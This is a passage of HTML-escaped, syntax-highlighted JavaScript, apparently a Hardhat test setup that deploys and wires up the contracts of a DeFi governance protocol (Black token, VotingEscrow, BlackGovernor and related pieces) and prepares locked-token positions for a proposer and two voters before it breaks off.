VoterFactoryLibFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await voterFactoryLib.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Libraries deployed (VBL, VFL).\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackTokenFactory = await ethers.getContractFactory(\u0026quot;Black\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackToken = await BlackTokenFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).initialMint(deployer.address); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token initialMint called by deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PermissionsRegistryFactory = await ethers.getContractFactory(\u0026quot;PermissionsRegistry\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        permissionsRegistry = await PermissionsRegistryFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  PermissionsRegistry deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, \u0026quot;GAUGE_ADMIN\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GAUGE_ADMIN role granted to deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await permissionsRegistry.connect(deployer).setRoleFor(deployer.address, \u0026quot;GOVERNANCE\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GOVERNANCE role granted to deployer.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const TokenHandlerFactory = await ethers.getContractFactory(\u0026quot;TokenHandler\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        tokenHandler = await TokenHandlerFactory.deploy(permissionsRegistry.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await tokenHandler.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  TokenHandler deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VotingEscrowFactory = await ethers.getContractFactory(\u0026quot;VotingEscrow\u0026quot;, {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            signer: deployer,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VotingBalanceLogic: votingBalanceLogic.address }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        votingEscrow = await VotingEscrowFactory.deploy(blackToken.address, teamEOA.address, teamEOA.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(deployer).setTeam(teamEOA.address); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  VotingEscrow deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const RewardsDistributorFactory = await ethers.getContractFactory(\u0026quot;RewardsDistributor\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        rewardsDistributor = await RewardsDistributorFactory.deploy(votingEscrow.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributor.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  RewardsDistributor deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PairGeneratorFactory = await ethers.getContractFactory(\u0026quot;PairGenerator\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairGenerator = await PairGeneratorFactory.deploy();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await pairGenerator.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const PairFactoryContract = await ethers.getContractFactory(\u0026quot;PairFactory\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairFactory = await upgrades.deployProxy(PairFactoryContract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [pairGenerator.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await pairFactory.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  PairFactory (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const AlgebraPoolAPIStorageFactory = await ethers.getContractFactory(\u0026quot;AlgebraPoolAPIStorage\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        algebraPoolAPIStorage = await upgrades.deployProxy(AlgebraPoolAPIStorageFactory, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [ZERO_ADDRESS, permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            {initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;]} \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await algebraPoolAPIStorage.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  AlgebraPoolAPIStorage (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeFactoryV2Contract = await ethers.getContractFactory(\u0026quot;GaugeFactory\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeFactoryV2 = await upgrades.deployProxy(GaugeFactoryV2Contract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryV2.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeFactoryCLContract = await ethers.getContractFactory(\u0026quot;GaugeFactoryCL\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeFactoryCL = await upgrades.deployProxy(GaugeFactoryCLContract, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            [permissionsRegistry.address], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryCL.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeFactoryCL.connect(deployer).setAlgebraPoolApi(algebraPoolAPIStorage.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Gauge Factories deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const GaugeManagerContractFactory = await ethers.getContractFactory(\u0026quot;GaugeManager\u0026quot;, { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            signer: deployer,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            libraries: { VoterFactoryLib: voterFactoryLib.address }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        gaugeManager = await upgrades.deployProxy(GaugeManagerContractFactory, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            votingEscrow.address, tokenHandler.address, gaugeFactoryV2.address, gaugeFactoryCL.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            pairFactory.address, ZERO_ADDRESS, permissionsRegistry.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;,         \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;, \u0026#39;external-library-linking\u0026#39;], \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  GaugeManager (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const VoterV3Contract = await ethers.getContractFactory(\u0026quot;VoterV3\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        voterV3 = await upgrades.deployProxy(VoterV3Contract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            votingEscrow.address, tokenHandler.address, gaugeManager.address, permissionsRegistry.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;] \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await voterV3.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  VoterV3 (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setVoter(voterV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(teamEOA).setVoter(voterV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BribeFactoryV3Contract = await ethers.getContractFactory(\u0026quot;BribeFactoryV3\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        bribeFactoryV3 = await upgrades.deployProxy(BribeFactoryV3Contract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            voterV3.address, gaugeManager.address, permissionsRegistry.address, tokenHandler.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { initializer: \u0026#39;initialize\u0026#39;, kind: \u0026#39;transparent\u0026#39;, unsafeAllow: [\u0026#39;constructor\u0026#39;] });\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await bribeFactoryV3.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setBribeFactory(bribeFactoryV3.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  BribeFactoryV3 (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterUpgradeableContract = await ethers.getContractFactory(\u0026quot;MinterUpgradeable\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        minterUpgradeable = await upgrades.deployProxy(MinterUpgradeableContract, [\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            gaugeManager.address, votingEscrow.address, rewardsDistributor.address\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        ], { \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            initializer: \u0026#39;initialize\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            kind: \u0026#39;transparent\u0026#39;, \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            unsafeAllow: [\u0026#39;constructor\u0026#39;] \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  MinterUpgradeable (proxy) deployed.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).setMinter(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Black token minter changed to MinterUpgradeable.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const BlackGovernorContract = await ethers.getContractFactory(\u0026quot;BlackGovernor\u0026quot;, deployer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        blackGovernor = await BlackGovernorContract.deploy(votingEscrow.address, minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.deployed();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(deployer).setTeam(teamEOA.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        // Set proposalNumerator to 0 to simplify threshold debugging for now\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackGovernor.connect(teamEOA).setProposalNumerator(0); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  BlackGovernor deployed and proposalNumerator set to 0.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).setGaugeManager(gaugeManager.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await minterUpgradeable.connect(deployer).setRewardDistributor(rewardsDistributor.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setMinter(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await gaugeManager.connect(deployer).setBlackGovernor(blackGovernor.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await rewardsDistributor.connect(deployer).setDepositor(minterUpgradeable.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const MinterInterface = MinterUpgradeableContract.interface; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        nudgeCalldata = MinterInterface.encodeFunctionData(\u0026quot;nudge\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;Preparing proposer and voters...\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTValueForProposer = ethers.utils.parseEther(\u0026quot;2000\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const smNFTLockValueForVoters = ethers.utils.parseEther(\u0026quot;500\u0026quot;); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        const lockDuration = CONTRACT_WEEK * 104; \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(proposerEOA.address, smNFTValueForProposer); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(smVoter1EOA.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(deployer).transfer(smVoter2EOA.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(proposerEOA).approve(votingEscrow.address, smNFTValueForProposer);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(proposerEOA).create_lock(smNFTValueForProposer, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  Proposer smNFT lock created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(smVoter1EOA).approve(votingEscrow.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(smVoter1EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smVoter1 smNFT created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await blackToken.connect(smVoter2EOA).approve(votingEscrow.address, smNFTLockValueForVoters);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        await votingEscrow.connect(smVoter2EOA).create_lock(smNFTLockValueForVoters, lockDuration, true); \u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        console.log(\u0026quot;  smVoter2 smNFT created.\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        